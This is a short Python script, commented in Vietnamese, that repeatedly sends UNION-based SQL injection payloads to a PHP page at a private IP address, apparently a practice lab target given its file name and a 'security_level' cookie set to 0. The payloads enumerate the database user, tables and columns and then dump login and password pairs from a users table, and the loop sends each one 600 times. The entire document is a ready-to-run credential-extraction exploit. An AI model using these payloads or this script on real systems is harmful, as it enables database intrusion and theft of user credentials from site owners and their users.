import requests
import time
import urllib.parse

# Danh sách các truy vấn SQL Injection bạn muốn thực hiện
queries = [
    "uyen ' union select 1,2,3,4,5,6,7 #",
    "uyen ' union select 1, user(),3,4,5,6,7 #",
    "uyen ' union select 1, (select GROUP_CONCAT(table_name,'\\n') from information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #",
    "uyen ' union select 1, (select GROUP_CONCAT(column_name,'\\n') FROM information_schema.columns WHERE table_name ='users'),3,4,5,6,7 #",
    "uyen' UNION SELECT 1, (SELECT GROUP_CONCAT(login,':', password) FROM users),3,4,5,6,7 #"
]

# URL cơ bản của trang web
base_url = "http://192.168.10.10/sqli_10-2.php"

# Cookie của bạn (PHPSESSID và security_level)
cookies = {
    "PHPSESSID": "0k6gg6biqflmnbb39ttveugod1",
    "security_level": "0"
}

# Số lần request cần thực hiện
num_requests = 600

# Hàm gửi request cho từng query
def send_requests():
    for i in range(num_requests):
        for query in queries:
            # Mã hóa URL query để đảm bảo các ký tự đặc biệt như dấu cách, nháy đơn, v.v. được mã hóa đúng
            encoded_query = urllib.parse.quote(query)
            url = f"{base_url}?title={encoded_query}"
            
            try:
                # Thực hiện request với cookie
                response = requests.get(url, cookies=cookies)
                # In ra kết quả (status code)
                print(f"Request {i+1}, status: {response.status_code}")
            except Exception as e:
                # In ra lỗi nếu có
                print(f"Error request {i+1}")
            # Thêm delay nếu cần
            time.sleep(0.5)  # Thay đổi thời gian delay nếu muốn

# Bắt đầu thực hiện requests
send_requests()

